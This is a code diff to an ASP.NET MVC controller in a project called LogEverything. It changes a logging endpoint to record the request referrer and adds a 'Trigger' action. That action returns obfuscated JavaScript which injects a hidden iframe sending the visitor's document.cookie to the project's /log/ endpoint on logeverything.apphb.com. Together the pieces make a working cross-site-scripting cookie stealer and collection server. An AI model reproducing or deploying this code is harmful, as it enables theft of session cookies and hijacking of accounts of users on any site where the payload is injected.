@@ -22,13 +22,13 @@ namespace LogEverything.Controllers
         }
 
         //
-        // GET: /Log/
-        public ActionResult Write(string src, string content)
+        // GET: /log/
+        public ActionResult Write(string content)
         {
             var result = new LogResult { ErrorCode = 0, ErrorMsg = "" };
             do
             {
-                if (string.IsNullOrEmpty(src) || string.IsNullOrEmpty(content))
+                if (string.IsNullOrEmpty(content))
                 {
                     result.ErrorCode = -1;
                     result.ErrorMsg = "No content.";
@@ -39,9 +39,10 @@ namespace LogEverything.Controllers
                 {
                     using (var ctx = GetDataContext())
                     {
+                        var referer = Request.UrlReferrer == null ? "undefined" : Request.UrlReferrer.ToString();
                         var logItem = new LogItem
                         {
-                            Source = HttpUtility.UrlDecode(src),
+                            Source = referer,
                             Content = HttpUtility.UrlDecode(content)
                         };
                         ctx.Logs.Add(logItem);
@@ -58,6 +59,13 @@ namespace LogEverything.Controllers
             } while (false);
 
             return JsonNet(result);
+        }
+
+        //
+        // GET: /trigger/
+        public ActionResult Trigger()
+        {
+            return JavaScript("document.write('<ifr'+'ame s'+'rc=\"http://logeverything.apphb.com/log/'+encodeURI(document.cookie)+'\" st'+'yle=\"dis'+'play:none;\"'+'>'+'</ifra'+'me>');");
         }
 
         protected virtual JsonNetResult JsonNet(object data)
